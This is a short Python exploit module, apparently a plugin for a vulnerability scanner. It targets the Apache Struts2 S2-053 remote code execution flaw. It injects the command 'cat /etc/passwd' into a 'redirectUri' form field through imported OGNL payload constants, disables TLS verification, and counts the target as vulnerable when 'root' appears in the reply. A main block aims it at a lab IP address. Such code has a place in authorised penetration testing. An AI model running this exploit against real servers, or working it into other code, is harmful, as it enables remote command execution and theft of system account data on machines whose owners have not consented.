import requests
from lib.log import logger
from typing import Optional

from plugins.package.payloads import PAYLOAD_STRUTS2_053_1, PAYLOAD_STRUTS2_053_2


def run(url: str) -> Optional[str]:
    """Exploit Struts2 S2-053 remote code execution vulnerability.
    Version: 2.0.1/2.3.33/2.5-2.5.10."""
    payload = f"{PAYLOAD_STRUTS2_053_1}cat /etc/passwd{PAYLOAD_STRUTS2_053_2}"
    headers = {'redirectUri': payload}

    try:
        logger.info(f"Sending payload to {url}")
        response = requests.post(url, data=headers, verify=False, timeout=5)
        if "root" in response.text:
            logger.success("S2-053 Vulnerable")
            logger.info(f"Response: {response.text}")
            return "S2-053 Vulnerable"
        logger.warning(f"Failed, no 'root' in response")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None


if __name__ == "__main__":
    print(run("http://192.168.27.128:8080/hello.action"))